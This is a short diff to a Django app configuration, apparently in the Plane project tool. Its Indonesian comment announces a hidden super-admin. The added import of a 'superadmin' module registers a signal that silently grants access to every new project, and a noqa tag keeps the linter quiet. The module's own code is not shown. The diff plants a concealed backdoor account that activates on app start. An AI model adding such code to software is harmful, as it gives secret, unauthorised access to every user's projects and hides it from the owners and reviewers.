@@ -13,3 +13,7 @@ class DbConfig(AppConfig):
         from plane.db.audit import register_audit_models
 
         register_audit_models()
+
+        # Super Admin tersembunyi (B.E.R): impor modulnya mendaftarkan signal
+        # yang memberi akses ke setiap project baru secara otomatis.
+        from plane.db import superadmin  # noqa: F401
